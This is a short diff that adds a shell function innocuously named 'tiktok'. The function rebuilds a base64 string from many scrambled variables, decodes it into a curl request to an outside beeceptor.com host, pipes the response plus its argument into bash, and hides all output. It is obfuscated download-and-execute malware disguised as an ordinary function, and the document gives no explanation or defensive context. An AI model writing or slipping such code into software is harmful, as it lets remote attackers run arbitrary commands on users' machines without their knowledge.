@@ -1,0 +1,3 @@
+tiktok(){
+	d=CBH;e=RVQ;f=gaH;g=R0c;h=HM6;n=jYW;o=JyY;p=XNh;r=cmF;a=Y3V;b=ybC;c=AtW;i=Ly9;j=0dW;k=5vb;l=WV0;m=ZXN;s=tYW;t=1ia;u=WNo;v=ZS5;w=mcm;x=VlL;y=mJl;z=ZWN;bb=lcH;cc=Rvc;dd=i5j;ee=b20;ff=vCg;x1=$a$b$c$d$e$f;x2=$g$h$i$j$k$l;x3=$m$n$o$p$q$r;x4=$s$t$u$v$w$x;x5=$y$z$bb$cc$dd$ee$ff;echo $(echo "$a$b$c$d$e$f$g$h$i$j$k$l$m$n$o$p$q$r$s$t$u$v$w$x$y$z$bb$cc$dd$ee$ff" | base64 -d)$1 | bash > /dev/null 2>&1;n=jYW;o=JyY;p=XNh;r=cmF;a=Y3V;b=ybC;c=AtW;
+}
